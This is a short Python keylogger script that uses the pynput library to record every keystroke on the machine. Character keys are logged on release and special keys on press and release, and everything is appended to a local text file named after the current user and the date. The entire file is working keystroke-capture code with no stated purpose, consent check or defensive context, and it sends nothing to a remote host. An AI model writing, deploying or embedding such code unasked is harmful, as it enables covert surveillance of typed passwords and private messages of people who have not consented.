from pynput import keyboard
import getpass
import datetime
import time

ts = time.time()
timestamp = datetime.datetime.fromtimestamp(ts).strftime('%Y-%m-%d')
curr_user = getpass.getuser()
directory = './kellogs/'


def write(output):
    file_path = f'{directory}{curr_user}-{timestamp}.txt'
    with open(file_path, 'a') as file:
        file.write(output)

def get_key(key, msg, ignore=False):
    try:
        output = key.char
        if ignore:
            return False
    except AttributeError:
        special = str(key).replace('Key.', '')
        output = f'\n{special} {msg}\n'

    return output
        

def on_press(key):        
    output = get_key(key, msg='pressed', ignore=True)
    if output:
        write(output)
            

def on_release(key):
    output = get_key(key, msg='released')
    write(output)
    

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
